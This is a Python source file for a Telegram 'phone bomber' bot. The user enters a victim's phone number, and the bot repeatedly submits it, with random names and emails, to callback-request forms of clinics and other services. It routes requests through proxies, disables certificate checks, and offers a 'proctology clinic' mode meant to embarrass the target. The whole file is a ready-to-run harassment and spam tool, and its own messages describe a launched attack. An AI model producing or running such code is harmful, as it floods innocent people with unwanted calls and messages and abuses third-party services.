from telebot import async_telebot, asyncio_filters, types
from telebot.asyncio_storage import StateMemoryStorage
from telebot.states import State, StatesGroup
from telebot.states.asyncio.context import StateContext

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

import sqlite3
import re

import json

import requests as req
import randomstuff as rs
import formatstuff as fstuff
from requests.packages.urllib3.exceptions import InsecureRequestWarning

req.packages.urllib3.disable_warnings(InsecureRequestWarning)

import os
from dotenv import load_dotenv

load_dotenv()

state_storage = StateMemoryStorage()
bot = async_telebot.AsyncTeleBot(os.getenv("BOT_TOKEN"))

servTable = {}
f = open("services.json",encoding="utf8")
servTable = json.loads(f.read())

req_headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'}

def parse_ph(s,ph):
	s = s.replace("{ph}",ph)
	s = s.replace("{ph_1}",ph[1:])
	s = s.replace("{ph_w}",fstuff.format_wide(ph))
	s = s.replace("{ph_s}",fstuff.format_strange(ph))
	
	s = s.replace("%rname%",rs.get_random_name())
	
	s = s.replace("%today%",rs.get_today())
	
	s = s.replace("%rmail%",rs.get_random_mail())
	
	if s == "%none%":
		s = None
	return s

async def send_request(service,cid,ph):
	tbl = servTable[service]
	dt = tbl["datatype"]
	payload = tbl["payload"]
	for a,b in payload.items():
		if type(b) is list or type(b) is tuple:
			newtuple = []
			for c in b:
				if type(c) is str:
					c = parse_ph(c,ph)
					
				newtuple.append(c)
			payload[a] = tuple(newtuple)
		else:
			b = parse_ph(b,ph)
			payload[a] = b

	if dt == "json":
		try:
			res = req.post(tbl["url"], json=payload, headers=req_headers, proxies=rs.get_proxy(), verify=False, timeout=5)
		except Exception as e:
			await bot.send_message(cid, f"❌ Ошибка отправки {tbl['name']} по номеру {ph}: {e}")
			return
	elif dt == "multipart":
		try:
			res = req.post(tbl["url"], files=payload, headers=req_headers, proxies=rs.get_proxy(), verify=False, timeout=5)
		except Exception as e:
			await bot.send_message(cid, f"❌ Ошибка отправки {tbl['name']} по номеру {ph}: {e}")
			return
	else:
		try:
			res = req.post(tbl["url"], data=payload, headers=req_headers, proxies=rs.get_proxy(), verify=False, timeout=5)
		except Exception as e:
			await bot.send_message(cid, f"❌ Ошибка отправки {tbl['name']} по номеру {ph}: {e}")
			return
	if res.status_code == 200:
		await bot.send_message(cid, f"✅ Заявка отправлена в {tbl['name']} по номеру {ph}")
	else:
		await bot.send_message(cid, f"❌ Ошибка отправки {tbl['name']} по номеру {ph}: Код {res.status_code}")
	return

modes = {
	"proctology":{
		"title":"Клиника проктологии",
		"services":["naedine","era_medcenter","junona_medcenter"]
	},
	"classic":{
		"title":"Это классика",
		"services":["sunlight","norvik","sayoris"]
	}
}

class States(StatesGroup):
	phone = State()

def gen_markup():
	markup = InlineKeyboardMarkup()
	markup.row_width = 2
	for k,v in modes.items():
		markup.add(InlineKeyboardButton(v["title"], callback_data=f"mode_{k}")),
	return markup

def validate_phone(ph):
	x = re.fullmatch(r"7[0-9]{10}", ph)
	return x != None

@bot.message_handler(commands=['help', 'start'])
async def send_welcome(message):
	text = '🧅 Луковый бомбер\n🔍 Выберите режим:'
	await bot.reply_to(message, text,reply_markup=gen_markup())

def make_connection():
	connection = sqlite3.connect('lukbomb.db')
	cursor = connection.cursor()
	return connection,cursor

cn,cu = make_connection()
cu.execute('''
CREATE TABLE IF NOT EXISTS users (
tgid INTEGER PRIMARY KEY,
phone TEXT NOT NULL
)
''')
cn.commit()
cn.close()

def set_phone_mode(id,ph):
	cn,cu = make_connection()
	cu.execute('SELECT * FROM users WHERE tgid=?',(id,))
	users = cu.fetchall()
	if len(users) < 1:
		cu.execute('INSERT INTO users (tgid,phone) VALUES (?, ?)', (id,ph))
	else:
		cu.execute('UPDATE users SET phone = ? WHERE tgid = ?', (ph,id))
	cn.commit()
	cn.close()

def get_phone_mode(id):
	cn,cu = make_connection()
	cu.execute('SELECT * FROM users WHERE tgid=?',(id,))
	users = cu.fetchall()
	cn.close()
	if len(users) < 1:
		return None
	else:
		return users[0][1]

@bot.message_handler(commands=['cancel'])
async def cancel_bomb(message):
	set_phone_mode(message.from_user.id,"")

@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call,state: StateContext):
	if call.data.startswith("mode_"):
		pm = get_phone_mode(call.from_user.id)
		if pm and pm != "":
			await bot.send_message(call.message.chat.id, "❌ У вас уже запущена атака")
			return
		
		set_phone_mode(call.from_user.id,call.data[5:])
		await state.set(States.phone)
		await bot.send_message(call.message.chat.id, "📞 Введите номер формата 7XXXXXXXXXX:")

deftime = 30

delay = 1

async def run_bomber_task(time,phone,msg):
	await bot.send_message(msg.chat.id, f"⏳ Спам запущен на {time} секунд")
	pm = get_phone_mode(msg.from_user.id)
	pt = modes[pm]["services"]
	loopt = len(pt)*delay
	loops = time//loopt

	for i in range(loops):
		for p in range(len(pt)):
			tpm = get_phone_mode(msg.from_user.id)
			if not tpm or tpm=="":
				break
			await send_request(pt[p],msg.chat.id,phone)
			# await asyncio.sleep(delay)
	set_phone_mode(msg.from_user.id,"")
	await bot.send_message(msg.chat.id, "⌛ Спам остановлен")
		

@bot.message_handler(state=States.phone)
async def phone_get(message: types.Message, state: StateContext):
	await state.delete()
	phone = message.text
	if not validate_phone(phone):
		await bot.send_message(message.chat.id, "❌ Вы ввели неверный номер")
	else:
		await run_bomber_task(deftime,phone,message)

bot.add_custom_filter(asyncio_filters.StateFilter(bot))

from telebot.states.asyncio.middleware import StateMiddleware

bot.setup_middleware(StateMiddleware(bot))

import asyncio
print("Bot polling started")
asyncio.run(bot.polling())